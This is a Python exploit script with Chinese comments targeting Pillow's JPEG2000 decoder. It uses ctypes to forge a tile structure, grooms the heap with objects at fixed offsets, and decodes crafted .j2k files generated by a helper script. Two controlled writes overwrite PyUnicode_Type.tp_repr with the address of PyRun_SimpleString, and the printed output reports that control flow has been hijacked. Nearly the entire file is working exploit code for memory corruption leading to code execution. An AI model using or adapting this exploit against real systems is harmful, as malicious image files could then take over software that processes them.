#!/usr/bin/env python3
# 终局：两段写 ⇒ 把【连续 32 位值】写进 PyUnicode_Type.tp_repr
#   段1: samples[0]=0x1a9c  at target+0 => 字节 9c 1a 00 00 ...
#   段2: samples[0]=0x0045  at target+2 => 字节 45 00 00 00 ...
#   => target 4 字节 = 9c 1a 45 00 = 0x00451a9c (PyRun_SimpleString)
import ctypes, gc, io, os, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908                      # PyUnicode_Type.tp_repr
VAL = 0x00451A9C                        # PyRun_SimpleString


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def mkfake(target, res_addr, data_size=4096):
    buf = bytearray(1024)
    fa = ctypes.addressof((ctypes.c_char * 1024).from_buffer(buf))
    put64(fa + 0x10, 1)          # compno=0, numresolutions=1
    put64(fa + 0x18, 1)          # minimum_num_resolutions
    put64(fa + 0x20, res_addr)   # resolutions -> 零结构
    put64(fa + 0x28, 40)
    put64(fa + 0x30, target)     # ★ data
    put64(fa + 0x38, 0)          # ownsData=0
    put64(fa + 0x40, data_size)
    put64(fa + 0x48, data_size)
    return buf, fa


def encode16_4tile(path, samples):
    vals = (list(samples) + [0] * 256)[:256]
    code = ("from PIL import Image
"
            "s = " + repr(vals) + "
"
            "im = Image.new('L', (16, 16))
"
            "im.putdata(s)
"
            "im.save(" + repr(path) + ", 'JPEG2000', tile_size=(8, 8), num_resolutions=4)
")
    subprocess.run([sys.executable, '-c', code], check=True)


def groom_and_decode(path, tries=6):
    for _ in range(tries):
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        if not good:
            del pairs
            continue
        ng = len(good)
        keep = [t2 for i, t2 in enumerate(good) if i != len(good) // 2]
        Ks2 = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        M = open(path, 'rb').read()
        try:
            im = Image.open(io.BytesIO(M)); im.load()
            return (im.size, ng)
        except BaseException as e:
            return ("ERR %r" % (e,), ng)
    return (None, 0)


res_buf = bytearray(512)
RESADDR = ctypes.addressof((ctypes.c_char * 512).from_buffer(res_buf))
put64(RESADDR + 0x08, 16)
put64(RESADDR + 0x0c, 16)
put64(RESADDR + 0x10, 1)
put64(RESADDR + 0x14, 1)

print("[*] tp_repr 原值 = %#x   目标值 = %#x" % (R(TP_REPR), VAL))
encode16_4tile('/tmp/pA.j2k', [VAL & 0xFFFF])            # 0x1a9c
encode16_4tile('/tmp/pB.j2k', [(VAL >> 16) & 0xFFFF])    # 0x0045

for stage, (pay, off) in enumerate([('/tmp/pA.j2k', 0), ('/tmp/pB.j2k', 2)], 1):
    fake_buf, FAKE = mkfake(TP_REPR + off, RESADDR)
    A = FAKE - 0x0c
    B = A + 0x1000
    C = A + 0x4000
    r = subprocess.run(['python3', '/tmp/mk13.py', pay, '/tmp/FF.j2k', '0', '23',
                        hex(A), hex(B), hex(C), '-370'], capture_output=True, text=True)
    if 'OK' not in r.stdout:
        print("段%d build 失败: %s" % (stage, (r.stdout + r.stderr)[:70])); sys.exit(1)
    res, ng = groom_and_decode('/tmp/FF.j2k')
    v = R(TP_REPR)
    print("[*] 段%d: data=%#x 解码=%s 相邻对=%d  tp_repr=%#x" % (stage, TP_REPR + off, res, ng, v))

final = R(TP_REPR)
print()
print("[*] 最终 tp_repr = %#x   期望(低32位) = %#x" % (final, VAL))
if (final & 0xFFFFFFFF) == VAL:
    print("\n★★★ 连续 32 位值写入成立：PyUnicode_Type.tp_repr = PyRun_SimpleString")
    print("    => 任意字段/任意值（多段拼装）⇒ 控制流改写入口打通")